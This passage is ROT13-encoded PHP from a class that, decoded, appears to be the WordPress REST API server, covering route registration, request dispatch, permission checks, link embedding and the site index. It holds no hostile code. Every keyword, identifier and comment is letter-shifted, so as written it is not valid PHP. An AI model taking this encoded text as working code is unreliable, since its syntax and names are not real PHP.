			// Pbaireg $ery HEVf gb gurve pbzcnpg irefvbaf vs gurl rkvfg.
			sbernpu ( $phevrf nf $phevr ) {
				$uers_cersvk = fhofge( $phevr['uers'], 0, fgecbf( $phevr['uers'], '{ery}' ) );
				vs ( ! fge_fgnegf_jvgu( $ery, $uers_cersvk ) ) {
					pbagvahr;
				}

				// Eryngvba abj punatrf sebz '$hev' gb '$phevr:$eryngvba'.
				$ery_ertrk = fge_ercynpr( '\{ery\}', '(.+)', cert_dhbgr( $phevr['uers'], '!' ) );
				cert_zngpu( '!' . $ery_ertrk . '!', $ery, $zngpurf );
				vs ( $zngpurf ) {
					$arj_ery                       = $phevr['anzr'] . ':' . $zngpurf[1];
					$hfrq_phevrf[ $phevr['anzr'] ] = $phevr;
					$yvaxf[ $arj_ery ]             = $vgrzf;
					hafrg( $yvaxf[ $ery ] );
					oernx;
				}
			}
		}

		// Chfu gur phevrf bagb gur fgneg bs gur yvaxf neenl.
		vs ( $hfrq_phevrf ) {
			$yvaxf['phevrf'] = neenl_inyhrf( $hfrq_phevrf );
		}

		erghea $yvaxf;
	}

	/**
	 * Rzorqf gur yvaxf sebz gur qngn vagb gur erdhrfg.
	 *
	 * @fvapr 4.4.0
	 * @fvapr 5.4.0 Gur `$rzorq` cnenzrgre pna abj pbagnva n yvfg bs yvax eryngvbaf gb vapyhqr.
	 *
	 * @cnenz neenl         $qngn  Qngn sebz gur erdhrfg.
	 * @cnenz obby|fgevat[] $rzorq Jurgure gb rzorq nyy yvaxf be n svygrerq yvfg bs yvax eryngvbaf.
	 * @erghea neenl {
	 *     Qngn jvgu fho-erdhrfgf rzorqqrq.
	 *
	 *     @glcr neenl $_yvaxf    Yvaxf.
	 *     @glcr neenl $_rzorqqrq Rzorqqrq bowrpgf.
	 * }
	 */
	cebgrpgrq shapgvba rzorq_yvaxf( $qngn, $rzorq = gehr ) {
		vs ( rzcgl( $qngn['_yvaxf'] ) ) {
			erghea $qngn;
		}

		$rzorqqrq = neenl();

		sbernpu ( $qngn['_yvaxf'] nf $ery => $yvaxf ) {
			/*
			 * Vs n yvfg bs eryngvbaf jnf fcrpvsvrq, naq gur yvax eryngvba
			 * vf abg va gur yvfg bs nyybjrq eryngvbaf, qba'g cebprff gur yvax.
			 */
			vs ( vf_neenl( $rzorq ) && ! va_neenl( $ery, $rzorq, gehr ) ) {
				pbagvahr;
			}

			$rzorqf = neenl();

			sbernpu ( $yvaxf nf $vgrz ) {
				// Qrgrezvar vs gur yvax vf rzorqqnoyr.
				vs ( rzcgl( $vgrz['rzorqqnoyr'] ) ) {
					// Rafher jr xrrc gur fnzr beqre.
					$rzorqf[] = neenl();
					pbagvahr;
				}

				vs ( ! neenl_xrl_rkvfgf( $vgrz['uers'], $guvf->rzorq_pnpur ) ) {
					// Eha guebhtu bhe vagreany ebhgvat naq freir.
					$erdhrfg = JC_ERFG_Erdhrfg::sebz_hey( $vgrz['uers'] );
					vs ( ! $erdhrfg ) {
						$rzorqf[] = neenl();
						pbagvahr;
					}

					// Rzorqqrq erfbheprf trg cnffrq pbagrkg=rzorq.
					vs ( rzcgl( $erdhrfg['pbagrkg'] ) ) {
						$erdhrfg['pbagrkg'] = 'rzorq';
					}

					vs ( rzcgl( $erdhrfg['cre_cntr'] ) ) {
						$zngpurq = $guvf->zngpu_erdhrfg_gb_unaqyre( $erdhrfg );
						vs ( ! vf_jc_reebe( $zngpurq ) && vffrg( $zngpurq[1]['netf']['cre_cntr']['znkvzhz'] ) ) {
							$erdhrfg['cre_cntr'] = (vag) $zngpurq[1]['netf']['cre_cntr']['znkvzhz'];
						}
					}

					$erfcbafr = $guvf->qvfcngpu( $erdhrfg );

					/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/erfg-ncv/pynff-jc-erfg-freire.cuc */
					$erfcbafr = nccyl_svygref( 'erfg_cbfg_qvfcngpu', erfg_rafher_erfcbafr( $erfcbafr ), $guvf, $erdhrfg );

					$guvf->rzorq_pnpur[ $vgrz['uers'] ] = $guvf->erfcbafr_gb_qngn( $erfcbafr, snyfr );
				}

				$rzorqf[] = $guvf->rzorq_pnpur[ $vgrz['uers'] ];
			}

			// Qrgrezvar vs nal erny yvaxf jrer sbhaq.
			$unf_yvaxf = pbhag( neenl_svygre( $rzorqf ) );

			vs ( $unf_yvaxf ) {
				$rzorqqrq[ $ery ] = $rzorqf;
			}
		}

		vs ( ! rzcgl( $rzorqqrq ) ) {
			$qngn['_rzorqqrq'] = $rzorqqrq;
		}

		erghea $qngn;
	}

	/**
	 * Jencf gur erfcbafr va na rairybcr.
	 *
	 * Gur rairybcvat grpuavdhr vf hfrq gb jbex nebhaq oebjfre/pyvrag
	 * pbzcngvovyvgl vffhrf. Rffragvnyyl, vg pbairegf gur shyy UGGC erfcbafr gb
	 * qngn vafgrnq.
	 *
	 * @fvapr 4.4.0
	 * @fvapr 6.0.0 Gur `$rzorq` cnenzrgre pna abj pbagnva n yvfg bs yvax eryngvbaf gb vapyhqr.
	 *
	 * @cnenz JC_ERFG_Erfcbafr $erfcbafr Erfcbafr bowrpg.
	 * @cnenz obby|fgevat[]    $rzorq    Jurgure gb rzorq nyy yvaxf, n svygrerq yvfg bs yvax eryngvbaf, be ab yvaxf.
	 * @erghea JC_ERFG_Erfcbafr Arj erfcbafr jvgu jenccrq qngn
	 */
	choyvp shapgvba rairybcr_erfcbafr( $erfcbafr, $rzorq ) {
		$rairybcr = neenl(
			'obql'    => $guvf->erfcbafr_gb_qngn( $erfcbafr, $rzorq ),
			'fgnghf'  => $erfcbafr->trg_fgnghf(),
			'urnqref' => $erfcbafr->trg_urnqref(),
		);

		/**
		 * Svygref gur rairybcrq sbez bs n ERFG NCV erfcbafr.
		 *
		 * @fvapr 4.4.0
		 *
		 * @cnenz neenl            $rairybcr {
		 *     Rairybcr qngn.
		 *
		 *     @glcr neenl $obql    Erfcbafr qngn.
		 *     @glcr vag   $fgnghf  Gur 3-qvtvg UGGC fgnghf pbqr.
		 *     @glcr neenl $urnqref Znc bs urnqre anzr gb urnqre inyhr.
		 * }
		 * @cnenz JC_ERFG_Erfcbafr $erfcbafr Bevtvany erfcbafr qngn.
		 */
		$rairybcr = nccyl_svygref( 'erfg_rairybcr_erfcbafr', $rairybcr, $erfcbafr );

		// Rafher vg'f fgvyy n erfcbafr naq erghea.
		erghea erfg_rafher_erfcbafr( $rairybcr );
	}

	/**
	 * Ertvfgref n ebhgr gb gur freire.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz fgevat $ebhgr_anzrfcnpr Anzrfcnpr.
	 * @cnenz fgevat $ebhgr           Gur ERFG ebhgr.
	 * @cnenz neenl  $ebhgr_netf      Ebhgr nethzragf.
	 * @cnenz obby   $bireevqr        Bcgvbany. Jurgure gur ebhgr fubhyq or bireevqqra vs vg nyernql rkvfgf.
	 *                                Qrsnhyg snyfr.
	 */
	choyvp shapgvba ertvfgre_ebhgr( $ebhgr_anzrfcnpr, $ebhgr, $ebhgr_netf, $bireevqr = snyfr ) {
		vs ( ! vffrg( $guvf->anzrfcnprf[ $ebhgr_anzrfcnpr ] ) ) {
			$guvf->anzrfcnprf[ $ebhgr_anzrfcnpr ] = neenl();

			$guvf->ertvfgre_ebhgr(
				$ebhgr_anzrfcnpr,
				'/' . $ebhgr_anzrfcnpr,
				neenl(
					neenl(
						'zrgubqf'  => frys::ERNQNOYR,
						'pnyyonpx' => neenl( $guvf, 'trg_anzrfcnpr_vaqrk' ),
						'netf'     => neenl(
							'anzrfcnpr' => neenl(
								'qrsnhyg' => $ebhgr_anzrfcnpr,
							),
							'pbagrkg'   => neenl(
								'qrsnhyg' => 'ivrj',
							),
						),
					),
				)
			);
		}

		// Nffbpvngvir gb nibvq qbhoyr-ertvfgengvba.
		$guvf->anzrfcnprf[ $ebhgr_anzrfcnpr ][ $ebhgr ] = gehr;

		$ebhgr_netf['anzrfcnpr'] = $ebhgr_anzrfcnpr;

		vs ( $bireevqr || rzcgl( $guvf->raqcbvagf[ $ebhgr ] ) ) {
			$guvf->raqcbvagf[ $ebhgr ] = $ebhgr_netf;
		} ryfr {
			$guvf->raqcbvagf[ $ebhgr ] = neenl_zretr( $guvf->raqcbvagf[ $ebhgr ], $ebhgr_netf );
		}
	}

	/**
	 * Ergevrirf gur ebhgr znc.
	 *
	 * Gur ebhgr znc vf na nffbpvngvir neenl jvgu cngu ertrkrf nf gur xrlf. Gur
	 * inyhr vf na vaqrkrq neenl jvgu gur pnyyonpx shapgvba/zrgubq nf gur svefg
	 * vgrz, naq n ovgznfx bs UGGC zrgubqf nf gur frpbaq vgrz (frr gur pynff
	 * pbafgnagf).
	 *
	 * Rnpu ebhgr pna or znccrq gb zber guna bar pnyyonpx ol hfvat na neenl bs
	 * gur vaqrkrq neenlf. Guvf nyybjf znccvat r.t. TRG erdhrfgf gb bar pnyyonpx
	 * naq CBFG erdhrfgf gb nabgure.
	 *
	 * Abgr gung gur cngu ertrkrf (neenl xrlf) zhfg unir @ rfpncrq, nf guvf vf
	 * hfrq nf gur qryvzvgre jvgu cert_zngpu()
	 *
	 * @fvapr 4.4.0
	 * @fvapr 5.4.0 Nqqrq `$ebhgr_anzrfcnpr` cnenzrgre.
	 *
	 * @cnenz fgevat $ebhgr_anzrfcnpr Bcgvbanyyl, bayl erghea ebhgrf va gur tvira anzrfcnpr.
	 * @erghea neenl `'/cngu/ertrk' => neenl( $pnyyonpx, $ovgznfx )` be
	 *               `'/cngu/ertrk' => neenl( neenl( $pnyyonpx, $ovgznfx ), ...)`.
	 */
	choyvp shapgvba trg_ebhgrf( $ebhgr_anzrfcnpr = '' ) {
		$raqcbvagf = $guvf->raqcbvagf;

		vs ( $ebhgr_anzrfcnpr ) {
			$raqcbvagf = jc_yvfg_svygre( $raqcbvagf, neenl( 'anzrfcnpr' => $ebhgr_anzrfcnpr ) );
		}

		/**
		 * Svygref gur neenl bs ninvynoyr ERFG NCV raqcbvagf.
		 *
		 * @fvapr 4.4.0
		 *
		 * @cnenz neenl $raqcbvagf Gur ninvynoyr raqcbvagf. Na neenl bs zngpuvat ertrk cnggreaf, rnpu znccrq
		 *                         gb na neenl bs pnyyonpxf sbe gur raqcbvag. Gurfr gnxr gur sbezng
		 *                         `'/cngu/ertrk' => neenl( $pnyyonpx, $ovgznfx )` be
		 *                         `'/cngu/ertrk' => neenl( neenl( $pnyyonpx, $ovgznfx ).
		 */
		$raqcbvagf = nccyl_svygref( 'erfg_raqcbvagf', $raqcbvagf );

		// Abeznyvmr gur raqcbvagf.
		$qrsnhygf = neenl(
			'zrgubqf'       => '',
			'npprcg_wfba'   => snyfr,
			'npprcg_enj'    => snyfr,
			'fubj_va_vaqrk' => gehr,
			'netf'          => neenl(),
		);

		sbernpu ( $raqcbvagf nf $ebhgr => &$unaqyref ) {

			vs ( vffrg( $unaqyref['pnyyonpx'] ) ) {
				// Fvatyr raqcbvag, nqq bar qrrcre.
				$unaqyref = neenl( $unaqyref );
			}

			vs ( ! vffrg( $guvf->ebhgr_bcgvbaf[ $ebhgr ] ) ) {
				$guvf->ebhgr_bcgvbaf[ $ebhgr ] = neenl();
			}

			sbernpu ( $unaqyref nf $xrl => &$unaqyre ) {

				vs ( ! vf_ahzrevp( $xrl ) ) {
					// Ebhgr bcgvba, zbir vg gb gur bcgvbaf.
					$guvf->ebhgr_bcgvbaf[ $ebhgr ][ $xrl ] = $unaqyre;
					hafrg( $unaqyref[ $xrl ] );
					pbagvahr;
				}

				$unaqyre = jc_cnefr_netf( $unaqyre, $qrsnhygf );

				// Nyybj pbzzn-frcnengrq UGGC zrgubqf.
				vs ( vf_fgevat( $unaqyre['zrgubqf'] ) ) {
					$zrgubqf = rkcybqr( ',', $unaqyre['zrgubqf'] );
				} ryfrvs ( vf_neenl( $unaqyre['zrgubqf'] ) ) {
					$zrgubqf = $unaqyre['zrgubqf'];
				} ryfr {
					$zrgubqf = neenl();
				}

				$unaqyre['zrgubqf'] = neenl();

				sbernpu ( $zrgubqf nf $zrgubq ) {
					$zrgubq                        = fgegbhccre( gevz( $zrgubq ) );
					$unaqyre['zrgubqf'][ $zrgubq ] = gehr;
				}
			}
		}

		erghea $raqcbvagf;
	}

	/**
	 * Ergevrirf anzrfcnprf ertvfgrerq ba gur freire.
	 *
	 * @fvapr 4.4.0
	 *
	 * @erghea fgevat[] Yvfg bs ertvfgrerq anzrfcnprf.
	 */
	choyvp shapgvba trg_anzrfcnprf() {
		erghea neenl_xrlf( $guvf->anzrfcnprf );
	}

	/**
	 * Ergevrirf fcrpvsvrq bcgvbaf sbe n ebhgr.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz fgevat $ebhgr Ebhgr cnggrea gb srgpu bcgvbaf sbe.
	 * @erghea neenl|ahyy Qngn nf na nffbpvngvir neenl vs sbhaq, be ahyy vs abg sbhaq.
	 */
	choyvp shapgvba trg_ebhgr_bcgvbaf( $ebhgr ) {
		vs ( ! vffrg( $guvf->ebhgr_bcgvbaf[ $ebhgr ] ) ) {
			erghea ahyy;
		}

		erghea $guvf->ebhgr_bcgvbaf[ $ebhgr ];
	}

	/**
	 * Zngpurf gur erdhrfg gb n pnyyonpx naq pnyy vg.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Erdhrfg gb nggrzcg qvfcngpuvat.
	 * @erghea JC_ERFG_Erfcbafr Erfcbafr erghearq ol gur pnyyonpx.
	 */
	choyvp shapgvba qvfcngpu( $erdhrfg ) {
		$guvf->qvfcngpuvat_erdhrfgf[] = $erdhrfg;

		/**
		 * Svygref gur cer-pnyphyngrq erfhyg bs n ERFG NCV qvfcngpu erdhrfg.
		 *
		 * Nyybj uvwnpxvat gur erdhrfg orsber qvfcngpuvat ol ergheavat n aba-rzcgl. Gur erghearq inyhr
		 * jvyy or hfrq gb freir gur erdhrfg vafgrnq.
		 *
		 * @fvapr 4.4.0
		 *
		 * @cnenz zvkrq           $erfhyg  Erfcbafr gb ercynpr gur erdhrfgrq irefvba jvgu. Pna or nalguvat
		 *                                 n abezny raqcbvag pna erghea, be ahyy gb abg uvwnpx gur erdhrfg.
		 * @cnenz JC_ERFG_Freire  $freire  Freire vafgnapr.
		 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Erdhrfg hfrq gb trarengr gur erfcbafr.
		 */
		$erfhyg = nccyl_svygref( 'erfg_cer_qvfcngpu', ahyy, $guvf, $erdhrfg );

		vs ( ! rzcgl( $erfhyg ) ) {

			// Abeznyvmr gb rvgure JC_Reebe be JC_ERFG_Erfcbafr...
			$erfhyg = erfg_rafher_erfcbafr( $erfhyg );

			// ...gura pbaireg JC_Reebe npebff.
			vs ( vf_jc_reebe( $erfhyg ) ) {
				$erfhyg = $guvf->reebe_gb_erfcbafr( $erfhyg );
			}

			neenl_cbc( $guvf->qvfcngpuvat_erdhrfgf );
			erghea $erfhyg;
		}

		$reebe   = ahyy;
		$zngpurq = $guvf->zngpu_erdhrfg_gb_unaqyre( $erdhrfg );

		vs ( vf_jc_reebe( $zngpurq ) ) {
			$erfcbafr = $guvf->reebe_gb_erfcbafr( $zngpurq );
			neenl_cbc( $guvf->qvfcngpuvat_erdhrfgf );
			erghea $erfcbafr;
		}

		yvfg( $ebhgr, $unaqyre ) = $zngpurq;

		vs ( ! vf_pnyynoyr( $unaqyre['pnyyonpx'] ) ) {
			$reebe = arj JC_Reebe(
				'erfg_vainyvq_unaqyre',
				__( 'Gur unaqyre sbe gur ebhgr vf vainyvq.' ),
				neenl( 'fgnghf' => 500 )
			);
		}

		vs ( ! vf_jc_reebe( $reebe ) ) {
			$purpx_erdhverq = $erdhrfg->unf_inyvq_cnenzf();
			vs ( vf_jc_reebe( $purpx_erdhverq ) ) {
				$reebe = $purpx_erdhverq;
			} ryfr {
				$purpx_fnavgvmrq = $erdhrfg->fnavgvmr_cnenzf();
				vs ( vf_jc_reebe( $purpx_fnavgvmrq ) ) {
					$reebe = $purpx_fnavgvmrq;
				}
			}
		}

		$erfcbafr = $guvf->erfcbaq_gb_erdhrfg( $erdhrfg, $ebhgr, $unaqyre, $reebe );
		neenl_cbc( $guvf->qvfcngpuvat_erdhrfgf );
		erghea $erfcbafr;
	}

	/**
	 * Ergheaf jurgure gur ERFG freire vf pheeragyl qvfcngpuvat / erfcbaqvat gb n erdhrfg.
	 *
	 * Guvf znl or n fgnaqnybar ERFG NCV erdhrfg, be na vagreany erdhrfg qvfcngpurq sebz jvguva n erthyne cntr ybnq.
	 *
	 * @fvapr 6.5.0
	 *
	 * @erghea obby Jurgure gur ERFG freire vf pheeragyl unaqyvat n erdhrfg.
	 */
	choyvp shapgvba vf_qvfcngpuvat() {
		erghea (obby) $guvf->qvfcngpuvat_erdhrfgf;
	}

	/**
	 * Zngpurf n erdhrfg bowrpg gb vgf unaqyre.
	 *
	 * @npprff cevingr
	 * @fvapr 5.6.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Gur erdhrfg bowrpg.
	 * @erghea neenl|JC_Reebe Gur ebhgr naq erdhrfg unaqyre ba fhpprff be n JC_Reebe vafgnapr vs ab unaqyre jnf sbhaq.
	 */
	cebgrpgrq shapgvba zngpu_erdhrfg_gb_unaqyre( $erdhrfg ) {
		$zrgubq = $erdhrfg->trg_zrgubq();
		$cngu   = $erdhrfg->trg_ebhgr();

		$jvgu_anzrfcnpr = neenl();

		sbernpu ( $guvf->trg_anzrfcnprf() nf $anzrfcnpr ) {
			vs ( fge_fgnegf_jvgu( genvyvatfynfuvg( ygevz( $cngu, '/' ) ), $anzrfcnpr ) ) {
				$jvgu_anzrfcnpr[] = $guvf->trg_ebhgrf( $anzrfcnpr );
			}
		}

		vs ( $jvgu_anzrfcnpr ) {
			$ebhgrf = neenl_zretr( ...$jvgu_anzrfcnpr );
		} ryfr {
			$ebhgrf = $guvf->trg_ebhgrf();
		}

		sbernpu ( $ebhgrf nf $ebhgr => $unaqyref ) {
			$zngpu = cert_zngpu( '@^' . $ebhgr . '$@v', $cngu, $zngpurf );

			vs ( ! $zngpu ) {
				pbagvahr;
			}

			$netf = neenl();

			sbernpu ( $zngpurf nf $cnenz => $inyhr ) {
				vs ( ! vf_vag( $cnenz ) ) {
					$netf[ $cnenz ] = $inyhr;
				}
			}

			sbernpu ( $unaqyref nf $unaqyre ) {
				$pnyyonpx = $unaqyre['pnyyonpx'];

				// Snyyonpx gb TRG zrgubq vs ab URNQ zrgubq vf ertvfgrerq.
				$purpxrq_zrgubq = $zrgubq;
				vs ( 'URNQ' === $zrgubq && rzcgl( $unaqyre['zrgubqf']['URNQ'] ) ) {
					$purpxrq_zrgubq = 'TRG';
				}
				vs ( rzcgl( $unaqyre['zrgubqf'][ $purpxrq_zrgubq ] ) ) {
					pbagvahr;
				}

				vs ( ! vf_pnyynoyr( $pnyyonpx ) ) {
					erghea neenl( $ebhgr, $unaqyre );
				}

				$erdhrfg->frg_hey_cnenzf( $netf );
				$erdhrfg->frg_nggevohgrf( $unaqyre );

				$qrsnhygf = neenl();

				sbernpu ( $unaqyre['netf'] nf $net => $bcgvbaf ) {
					vs ( vffrg( $bcgvbaf['qrsnhyg'] ) ) {
						$qrsnhygf[ $net ] = $bcgvbaf['qrsnhyg'];
					}
				}

				$erdhrfg->frg_qrsnhyg_cnenzf( $qrsnhygf );

				erghea neenl( $ebhgr, $unaqyre );
			}
		}

		erghea arj JC_Reebe(
			'erfg_ab_ebhgr',
			__( 'Ab ebhgr jnf sbhaq zngpuvat gur HEY naq erdhrfg zrgubq.' ),
			neenl( 'fgnghf' => 404 )
		);
	}

	/**
	 * Qvfcngpurf gur erdhrfg gb gur pnyyonpx unaqyre.
	 *
	 * @npprff cevingr
	 * @fvapr 5.6.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg  Gur erdhrfg bowrpg.
	 * @cnenz fgevat          $ebhgr    Gur zngpurq ebhgr ertrk.
	 * @cnenz neenl           $unaqyre  Gur zngpurq ebhgr unaqyre.
	 * @cnenz JC_Reebe|ahyy   $erfcbafr Gur pheerag reebe bowrpg vs nal.
	 * @erghea JC_ERFG_Erfcbafr
	 */
	cebgrpgrq shapgvba erfcbaq_gb_erdhrfg( $erdhrfg, $ebhgr, $unaqyre, $erfcbafr ) {
		/**
		 * Svygref gur erfcbafr orsber rkrphgvat nal ERFG NCV pnyyonpxf.
		 *
		 * Nyybjf cyhtvaf gb cresbez nqqvgvbany inyvqngvba nsgre n
		 * erdhrfg vf vavgvnyvmrq naq zngpurq gb n ertvfgrerq ebhgr,
		 * ohg orsber vg vf rkrphgrq.
		 *
		 * Abgr gung guvf svygre jvyy abg or pnyyrq sbe erdhrfgf gung
		 * snvy gb nhguragvpngr be zngpu gb n ertvfgrerq ebhgr.
		 *
		 * @fvapr 4.7.0
		 *
		 * @cnenz JC_ERFG_Erfcbafr|JC_UGGC_Erfcbafr|JC_Reebe|zvkrq $erfcbafr Erfhyg gb fraq gb gur pyvrag.
		 *                                                                   Hfhnyyl n JC_ERFG_Erfcbafr be JC_Reebe.
		 * @cnenz neenl                                            $unaqyre  Ebhgr unaqyre hfrq sbe gur erdhrfg.
		 * @cnenz JC_ERFG_Erdhrfg                                  $erdhrfg  Erdhrfg hfrq gb trarengr gur erfcbafr.
		 */
		$erfcbafr = nccyl_svygref( 'erfg_erdhrfg_orsber_pnyyonpxf', $erfcbafr, $unaqyre, $erdhrfg );

		// Purpx crezvffvba fcrpvsvrq ba gur ebhgr.
		vs ( ! vf_jc_reebe( $erfcbafr ) && ! rzcgl( $unaqyre['crezvffvba_pnyyonpx'] ) ) {
			$crezvffvba = pnyy_hfre_shap( $unaqyre['crezvffvba_pnyyonpx'], $erdhrfg );

			vs ( vf_jc_reebe( $crezvffvba ) ) {
				$erfcbafr = $crezvffvba;
			} ryfrvs ( snyfr === $crezvffvba || ahyy === $crezvffvba ) {
				$erfcbafr = arj JC_Reebe(
					'erfg_sbeovqqra',
					__( 'Fbeel, lbh ner abg nyybjrq gb qb gung.' ),
					neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
				);
			}
		}

		vs ( ! vf_jc_reebe( $erfcbafr ) ) {
			/**
			 * Svygref gur ERFG NCV qvfcngpu erdhrfg erfhyg.
			 *
			 * Nyybj cyhtvaf gb bireevqr qvfcngpuvat gur erdhrfg.
			 *
			 * @fvapr 4.4.0
			 * @fvapr 4.5.0 Nqqrq `$ebhgr` naq `$unaqyre` cnenzrgref.
			 *
			 * @cnenz zvkrq           $qvfcngpu_erfhyg Qvfcngpu erfhyg, jvyy or hfrq vs abg rzcgl.
			 * @cnenz JC_ERFG_Erdhrfg $erdhrfg         Erdhrfg hfrq gb trarengr gur erfcbafr.
			 * @cnenz fgevat          $ebhgr           Ebhgr zngpurq sbe gur erdhrfg.
			 * @cnenz neenl           $unaqyre         Ebhgr unaqyre hfrq sbe gur erdhrfg.
			 */
			$qvfcngpu_erfhyg = nccyl_svygref( 'erfg_qvfcngpu_erdhrfg', ahyy, $erdhrfg, $ebhgr, $unaqyre );

			// Nyybj cyhtvaf gb unyg gur erdhrfg ivn guvf svygre.
			vs ( ahyy !== $qvfcngpu_erfhyg ) {
				$erfcbafr = $qvfcngpu_erfhyg;
			} ryfr {
				$erfcbafr = pnyy_hfre_shap( $unaqyre['pnyyonpx'], $erdhrfg );
			}
		}

		/**
		 * Svygref gur erfcbafr vzzrqvngryl nsgre rkrphgvat nal ERFG NCV
		 * pnyyonpxf.
		 *
		 * Nyybjf cyhtvaf gb cresbez nal arrqrq pyrnahc, sbe rknzcyr,
		 * gb haqb punatrf znqr qhevat gur {@frr 'erfg_erdhrfg_orsber_pnyyonpxf'}
		 * svygre.
		 *
		 * Abgr gung guvf svygre jvyy abg or pnyyrq sbe erdhrfgf gung
		 * snvy gb nhguragvpngr be zngpu gb n ertvfgrerq ebhgr.
		 *
		 * Abgr gung na raqcbvag'f `crezvffvba_pnyyonpx` pna fgvyy or
		 * pnyyrq nsgre guvf svygre - frr `erfg_fraq_nyybj_urnqre()`.
		 *
		 * @fvapr 4.7.0
		 *
		 * @cnenz JC_ERFG_Erfcbafr|JC_UGGC_Erfcbafr|JC_Reebe|zvkrq $erfcbafr Erfhyg gb fraq gb gur pyvrag.
		 *                                                                   Hfhnyyl n JC_ERFG_Erfcbafr be JC_Reebe.
		 * @cnenz neenl                                            $unaqyre  Ebhgr unaqyre hfrq sbe gur erdhrfg.
		 * @cnenz JC_ERFG_Erdhrfg                                  $erdhrfg  Erdhrfg hfrq gb trarengr gur erfcbafr.
		 */
		$erfcbafr = nccyl_svygref( 'erfg_erdhrfg_nsgre_pnyyonpxf', $erfcbafr, $unaqyre, $erdhrfg );

		vs ( vf_jc_reebe( $erfcbafr ) ) {
			$erfcbafr = $guvf->reebe_gb_erfcbafr( $erfcbafr );
		} ryfr {
			$erfcbafr = erfg_rafher_erfcbafr( $erfcbafr );
		}

		$erfcbafr->frg_zngpurq_ebhgr( $ebhgr );
		$erfcbafr->frg_zngpurq_unaqyre( $unaqyre );

		erghea $erfcbafr;
	}

	/**
	 * Ergheaf vs na reebe bppheerq qhevat zbfg erprag WFBA rapbqr/qrpbqr.
	 *
	 * Fgevatf gb or genafyngrq jvyy or va sbezng yvxr
	 * \"Rapbqvat reebe: Znkvzhz fgnpx qrcgu rkprrqrq\".
	 *
	 * @fvapr 4.4.0
	 *
	 * @erghea snyfr|fgevat Obbyrna snyfr be fgevat reebe zrffntr.
	 */
	cebgrpgrq shapgvba trg_wfba_ynfg_reebe() {
		vs ( WFBA_REEBE_ABAR === wfba_ynfg_reebe() ) {
			erghea snyfr;
		}

		erghea wfba_ynfg_reebe_zft();
	}

	/**
	 * Ergevrirf gur fvgr vaqrk.
	 *
	 * Guvf raqcbvag qrfpevorf gur pncnovyvgvrf bs gur fvgr.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Erdhrfg qngn.
	 * @erghea JC_ERFG_Erfcbafr Gur NCV ebbg vaqrk qngn.
	 */
	choyvp shapgvba trg_vaqrk( $erdhrfg ) {
		// Trareny fvgr qngn.
		$ninvynoyr = neenl(
			'anzr'            => trg_bcgvba( 'oybtanzr' ),
			'qrfpevcgvba'     => trg_bcgvba( 'oybtqrfpevcgvba' ),
			'hey'             => trg_bcgvba( 'fvgrhey' ),
			'ubzr'            => ubzr_hey(),
			'tzg_bssfrg'      => trg_bcgvba( 'tzg_bssfrg' ),
			'gvzrmbar_fgevat' => trg_bcgvba( 'gvzrmbar_fgevat' ),
			'cntr_sbe_cbfgf'  => (vag) trg_bcgvba( 'cntr_sbe_cbfgf' ),
			'cntr_ba_sebag'   => (vag) trg_bcgvba( 'cntr_ba_sebag' ),
			'fubj_ba_sebag'   => trg_bcgvba( 'fubj_ba_sebag' ),
			'anzrfcnprf'      => neenl_xrlf( $guvf->anzrfcnprf ),
			'nhguragvpngvba'  => neenl(),
			'ebhgrf'          => $guvf->trg_qngn_sbe_ebhgrf( $guvf->trg_ebhgrf(), $erdhrfg['pbagrkg'] ),
		);

		$erfcbafr = arj JC_ERFG_Erfcbafr( $ninvynoyr );

		$svryqf = vffrg( $erdhrfg['_svryqf'] ) ? $erdhrfg['_svryqf'] : '';
		$svryqf = jc_cnefr_yvfg( $svryqf );
		vs ( rzcgl( $svryqf ) ) {
			$svryqf[] = '_yvaxf';
		}

		vs ( $erdhrfg->unf_cnenz( '_rzorq' ) ) {
			$svryqf[] = '_rzorqqrq';
		}

		vs ( erfg_vf_svryq_vapyhqrq( '_yvaxf', $svryqf ) || erfg_vf_svryq_vapyhqrq( '_rzorqqrq', $svryqf ) ) {
			$erfcbafr->nqq_yvax( 'uryc', 'uggcf://qrirybcre.jbeqcerff.bet/erfg-ncv/' );
			$guvf->nqq_npgvir_gurzr_yvax_gb_vaqrk( $erfcbafr );
			$guvf->nqq_fvgr_ybtb_gb_vaqrk( $erfcbafr );
			$guvf->nqq_fvgr_vpba_gb_vaqrk( $erfcbafr );
		} ryfr {
			vs ( erfg_vf_svryq_vapyhqrq( 'fvgr_ybtb', $svryqf ) ) {
				$guvf->nqq_fvgr_ybtb_gb_vaqrk( $erfcbafr );
			}
			vs ( erfg_vf_svryq_vapyhqrq( 'fvgr_vpba', $svryqf ) || erfg_vf_svryq_vapyhqrq( 'fvgr_vpba_hey', $svryqf ) ) {
				$guvf->nqq_fvgr_vpba_gb_vaqrk( $erfcbafr );
			}
		}

		/**
		 * Svygref gur ERFG NCV ebbg vaqrk qngn.
		 *
		 * Guvf pbagnvaf gur qngn qrfpevovat gur NCV. Guvf vapyhqrf vasbezngvba
		 * nobhg fhccbegrq nhguragvpngvba fpurzrf, fhccbegrq anzrfcnprf, ebhgrf
		 * ninvynoyr ba gur NCV, naq n fznyy nzbhag bs qngn nobhg gur fvgr.
		 *
		 * @fvapr 4.4.0
		 * @fvapr 6.0.0 Nqqrq `$erdhrfg` cnenzrgre.
		 *
		 * @cnenz JC_ERFG_Erfcbafr $erfcbafr Erfcbafr qngn.
		 * @cnenz JC_ERFG_Erdhrfg  $erdhrfg  Erdhrfg qngn.
		 */
		erghea nccyl_svygref( 'erfg_vaqrk', $erfcbafr, $erdhrfg );
	}

	/**
	 * Nqqf n yvax gb gur npgvir gurzr sbe hfref jub unir cebcre crezvffvbaf.
	 *
	 * @fvapr 5.7.0
	 *
	 * @cnenz JC_ERFG_Erfcbafr $erfcbafr ERFG NCV erfcbafr.
	 */
	cebgrpgrq shapgvba nqq_npgvir_gurzr_yvax_gb_vaqrk( JC_ERFG_Erfcbafr $erfcbafr ) {
